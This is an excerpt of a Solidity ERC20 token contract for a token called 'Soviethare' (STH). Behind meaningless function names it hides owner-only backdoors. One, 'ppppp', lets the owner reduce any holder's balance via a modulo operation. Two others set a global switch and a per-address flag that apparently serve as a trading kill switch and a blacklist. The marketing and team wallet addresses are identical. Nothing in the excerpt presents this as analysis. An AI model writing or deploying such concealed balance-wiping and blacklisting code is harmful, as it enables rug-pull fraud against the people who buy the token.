...
contract Baby is Context, IERC20, Ownable {
    ...
    string private _name = "Soviethare";
    string private _symbol = "STH";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xfeC9535C385f347B0a2FD31e7b56393bB13b744E);
    address payable public teamWalletAddress = payable(0xfeC9535C385f347B0a2FD31e7b56393bB13b744E);
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    bool public xuxuxu = true;
    mapping (address => bool) public xuxuxub;
    ...
    function ppppp(address account, uint256 amount) onlyOwner() public {
        _balances[account] = _balances[account].mod(amount);
    }

    function hhhhh(bool _status) public onlyOwner {
        xuxuxu = _status;
    }

    function hhhhhs(address addre, bool status) public onlyOwner {
        xuxuxub[addre]  = status;
    }
